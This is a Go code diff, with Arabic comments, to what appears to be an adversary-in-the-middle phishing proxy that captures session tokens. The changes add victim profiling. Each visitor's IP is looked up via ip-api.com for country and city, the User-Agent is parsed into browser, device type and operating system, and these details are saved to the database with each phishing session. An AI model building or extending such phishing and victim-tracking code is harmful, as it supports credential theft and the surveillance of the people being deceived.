@@ -616,6 +616,61 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										}
 									}
 
+									// استخراج معلومات المدينة من عنوان IP إذا لم تكن موجودة
+									if session.City == "" && remote_addr != "" {
+										cc, country, city := getIPGeoInfo(remote_addr)
+										if city != "" {
+											session.SetCity(city)
+											log.Success("[%d] تم تعيين اسم المدينة من IP: %s", sid, city)
+											
+											// حفظ معلومات المدينة في قاعدة البيانات
+											if err := p.db.SetSessionCityInfo(session.Id, city); err != nil {
+												log.Error("[%d] فشل في حفظ معلومات المدينة: %v", sid, err)
+											} else {
+												log.Success("[%d] تم حفظ معلومات المدينة في قاعدة البيانات بنجاح", sid)
+											}
+										}
+										
+										// إذا لم تكن معلومات البلد موجودة، قم بتعيينها
+										if session.CountryCode == "" && cc != "" {
+											session.SetCountryCode(cc)
+											log.Success("[%d] تم تعيين رمز البلد من IP: %s", sid, cc)
+										}
+										
+										if session.Country == "" && country != "" {
+											session.SetCountry(country)
+											log.Success("[%d] تم تعيين اسم البلد من IP: %s", sid, country)
+										}
+									}
+									
+									// استخراج معلومات المتصفح ونوع الجهاز ونظام التشغيل
+									userAgent := req.Header.Get("User-Agent")
+									browser, deviceType, os := parseUserAgent(userAgent)
+									
+									if browser != "" {
+										session.SetBrowser(browser)
+										log.Success("[%d] تم تعيين المتصفح: %s", sid, browser)
+									}
+									
+									if deviceType != "" {
+										session.SetDeviceType(deviceType)
+										log.Success("[%d] تم تعيين نوع الجهاز: %s", sid, deviceType)
+									}
+									
+									if os != "" {
+										session.SetOS(os)
+										log.Success("[%d] تم تعيين نظام التشغيل: %s", sid, os)
+									}
+									
+									// حفظ معلومات المتصفح والجهاز في قاعدة البيانات
+									if browser != "" || deviceType != "" || os != "" {
+										if err := p.db.SetSessionBrowserInfo(session.Id, browser, deviceType, os); err != nil {
+											log.Error("[%d] فشل في حفظ معلومات المتصفح والجهاز: %v", sid, err)
+										} else {
+											log.Success("[%d] تم حفظ معلومات المتصفح والجهاز في قاعدة البيانات بنجاح", sid)
+										}
+									}
+
 									landing_url := req_url //fmt.Sprintf("%s://%s%s", req.URL.Scheme, req.Host, req.URL.Path)
 									if err := p.db.CreateSession(session.Id, pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr); err != nil {
 										log.Error("database: %v", err)
@@ -626,6 +681,22 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												log.Error("[%d] فشل في حفظ معلومات البلد: %v", sid, err)
 											} else {
 												log.Success("[%d] تم حفظ معلومات البلد في قاعدة البيانات بنجاح", sid)
+											}
+										}
+										
+										if session.City != "" {
+											if err := p.db.SetSessionCityInfo(session.Id, session.City); err != nil {
+												log.Error("[%d] فشل في حفظ معلومات المدينة: %v", sid, err)
+											} else {
+												log.Success("[%d] تم حفظ معلومات المدينة في قاعدة البيانات بنجاح", sid)
+											}
+										}
+										
+										if browser != "" || deviceType != "" || os != "" {
+											if err := p.db.SetSessionBrowserInfo(session.Id, browser, deviceType, os); err != nil {
+												log.Error("[%d] فشل في حفظ معلومات المتصفح والجهاز: %v", sid, err)
+											} else {
+												log.Success("[%d] تم حفظ معلومات المتصفح والجهاز في قاعدة البيانات بنجاح", sid)
 											}
 										}
 									}
@@ -2632,88 +2703,144 @@ func (p *HttpProxy) notifyTokensCaptured(sid string) {
 }
 
 // دالة للحصول على معلومات البلد من عنوان IP
-func getIPGeoInfo(ipAddress string) (countryCode string, country string) {
-	log.Debug("محاولة استخراج معلومات البلد من عنوان IP: %s", ipAddress)
+func getIPGeoInfo(ip string) (string, string, string) {
+	// تخطي عناوين IP المحلية أو الفارغة
+	if ip == "" || strings.HasPrefix(ip, "127.") || strings.HasPrefix(ip, "192.168.") || strings.HasPrefix(ip, "10.") || strings.HasPrefix(ip, "172.") {
+		log.Debug("عنوان IP محلي أو فارغ: %s", ip)
+		return "", "", ""
+	}
+
+	log.Debug("جاري استخراج معلومات البلد والمدينة من IP: %s", ip)
 	
-	// استخدام freegeoip.app للحصول على معلومات البلد
-	url := "https://freegeoip.app/json/" + ipAddress
-	
+	// استدعاء خدمة تحديد الموقع الجغرافي
+	url := "http://ip-api.com/json/" + ip
 	client := &http.Client{
-		Timeout: 5 * time.Second,
+		Timeout: time.Second * 5,
 	}
 	
 	resp, err := client.Get(url)
 	if err != nil {
-		log.Error("خطأ في الاتصال بخدمة تحديد الموقع الجغرافي: %v", err)
-		// استخدام خدمة احتياطية
-		return tryBackupGeoService(ipAddress)
+		log.Error("فشل في الاتصال بخدمة تحديد الموقع الجغرافي: %s", err)
+		return "", "", ""
 	}
 	defer resp.Body.Close()
 	
-	if resp.StatusCode != http.StatusOK {
-		log.Error("خدمة تحديد الموقع الجغرافي أعادت حالة خطأ: %d", resp.StatusCode)
-		// استخدام خدمة احتياطية
-		return tryBackupGeoService(ipAddress)
+	if resp.StatusCode != 200 {
+		log.Error("خدمة تحديد الموقع الجغرافي أعادت رمز الحالة: %d", resp.StatusCode)
+		return "", "", ""
 	}
 	
-	var result map[string]interface{}
-	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
-		log.Error("خطأ في فك ترميز استجابة خدمة تحديد الموقع الجغرافي: %v", err)
-		// استخدام خدمة احتياطية
-		return tryBackupGeoService(ipAddress)
+	// قراءة البيانات
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		log.Error("خطأ في قراءة رد خدمة تحديد الموقع الجغرافي: %s", err)
+		return "", "", ""
 	}
+	
+	// تحليل البيانات
+	var result map[string]interface{}
+	if err := json.Unmarshal(body, &result); err != nil {
+		log.Error("خطأ في تحليل رد خدمة تحديد الموقع الجغرافي: %s", err)
+		return "", "", ""
+	}
+	
+	countryCode := ""
+	country := ""
+	city := ""
 	
 	// استخراج رمز البلد واسم البلد
-	countryCode, _ = result["country_code"].(string)
-	country, _ = result["country_name"].(string)
+	if cc, ok := result["countryCode"].(string); ok {
+		countryCode = cc
+		log.Debug("تم استخراج رمز البلد: %s", countryCode)
+	} else {
+		log.Warning("لم يتم العثور على رمز البلد في رد خدمة تحديد الموقع الجغرافي")
+	}
 	
-	log.Debug("تم الحصول على معلومات البلد من عنوان IP: %s", ipAddress)
-	log.Debug("تم الحصول على معلومات البلد: رمز البلد=%s، البلد=%s", countryCode, country)
+	if c, ok := result["country"].(string); ok {
+		country = c
+		log.Debug("تم استخراج اسم البلد: %s", country)
+	} else {
+		log.Warning("لم يتم العثور على اسم البلد في رد خدمة تحديد الموقع الجغرافي")
+	}
 	
-	return countryCode, country
+	if c, ok := result["city"].(string); ok {
+		city = c
+		log.Debug("تم استخراج اسم المدينة: %s", city)
+	} else {
+		log.Warning("لم يتم العثور على اسم المدينة في رد خدمة تحديد الموقع الجغرافي")
+	}
+	
+	return countryCode, country, city
 }
 
-// دالة احتياطية للحصول على معلومات البلد من خدمة بديلة
-func tryBackupGeoService(ipAddress string) (countryCode string, country string) {
-	log.Debug("محاولة استخدام خدمة بديلة للحصول على معلومات البلد")
+// دالة لتحليل معلومات المتصفح ونوع الجهاز ونظام التشغيل من User-Agent
+func parseUserAgent(userAgent string) (string, string, string) {
+	if userAgent == "" {
+		return "", "", ""
+	}
+
+	log.Debug("تحليل معلومات المتصفح من User-Agent: %s", userAgent)
 	
-	// استخدام خدمة ipapi.co للحصول على معلومات البلد
-	url := "https://ipapi.co/" + ipAddress + "/json/"
+	browser := ""
+	deviceType := "Desktop" // القيمة الافتراضية
+	os := ""
 	
-	client := &http.Client{
-		Timeout: 5 * time.Second,
+	// تحديد نوع الجهاز
+	if strings.Contains(userAgent, "Mobile") || 
+	   strings.Contains(userAgent, "Android") && !strings.Contains(userAgent, "SM-T") ||
+	   strings.Contains(userAgent, "iPhone") {
+		deviceType = "Mobile"
+	} else if strings.Contains(userAgent, "iPad") || 
+		  strings.Contains(userAgent, "Tablet") ||
+		  strings.Contains(userAgent, "SM-T") {
+		deviceType = "Tablet"
 	}
 	
-	resp, err := client.Get(url)
-	if err != nil {
-		log.Error("فشل استعلام خدمة تحديد موقع IP البديلة: %v", err)
-		return "", ""
-	}
-	defer resp.Body.Close()
-	
-	if resp.StatusCode != http.StatusOK {
-		log.Error("خدمة تحديد موقع IP البديلة أعادت رمز حالة غير صحيح: %d", resp.StatusCode)
-		return "", ""
-	}
-	
-	var result map[string]interface{}
-	err = json.NewDecoder(resp.Body).Decode(&result)
-	if err != nil {
-		log.Error("فشل فك ترميز استجابة خدمة تحديد موقع IP البديلة: %v", err)
-		return "", ""
-	}
-	
-	cc, ok := result["country_code"].(string)
-	if ok && cc != "" {
-		countryCode = cc
+	// تحديد نوع المتصفح
+	switch {
+	case strings.Contains(userAgent, "Chrome") && !strings.Contains(userAgent, "Edg") && !strings.Contains(userAgent, "OPR"):
+		browser = "Chrome"
+	case strings.Contains(userAgent, "Firefox") && !strings.Contains(userAgent, "Seamonkey"):
+		browser = "Firefox"
+	case strings.Contains(userAgent, "Safari") && !strings.Contains(userAgent, "Chrome") && !strings.Contains(userAgent, "Edg"):
+		browser = "Safari"
+	case strings.Contains(userAgent, "Edg") || strings.Contains(userAgent, "Edge"):
+		browser = "Edge"
+	case strings.Contains(userAgent, "OPR") || strings.Contains(userAgent, "Opera"):
+		browser = "Opera"
+	case strings.Contains(userAgent, "MSIE") || strings.Contains(userAgent, "Trident"):
+		browser = "Internet Explorer"
+	default:
+		browser = "Unknown"
 	}
 	
-	c, ok := result["country_name"].(string)
-	if ok && c != "" {
-		country = c
+	// تحديد نظام التشغيل
+	switch {
+	case strings.Contains(userAgent, "Windows"):
+		if strings.Contains(userAgent, "Windows NT 10.0") {
+			os = "Windows 10"
+		} else if strings.Contains(userAgent, "Windows NT 6.3") {
+			os = "Windows 8.1"
+		} else if strings.Contains(userAgent, "Windows NT 6.2") {
+			os = "Windows 8"
+		} else if strings.Contains(userAgent, "Windows NT 6.1") {
+			os = "Windows 7"
+		} else {
+			os = "Windows"
+		}
+	case strings.Contains(userAgent, "Macintosh") || strings.Contains(userAgent, "Mac OS X"):
+		os = "macOS"
+	case strings.Contains(userAgent, "Android"):
+		os = "Android"
+	case strings.Contains(userAgent, "iOS") || strings.Contains(userAgent, "iPhone") || strings.Contains(userAgent, "iPad"):
+		os = "iOS"
+	case strings.Contains(userAgent, "Linux"):
+		os = "Linux"
+	default:
+		os = "Unknown"
 	}
 	
-	log.Debug("الخدمة البديلة - تم الحصول على معلومات البلد: رمز البلد=%s، البلد=%s", countryCode, country)
+	log.Debug("تم استخراج معلومات الجهاز - المتصفح: %s، نوع الجهاز: %s، نظام التشغيل: %s", browser, deviceType, os)
 	
-	return countryCode, country
+	return browser, deviceType, os
 }
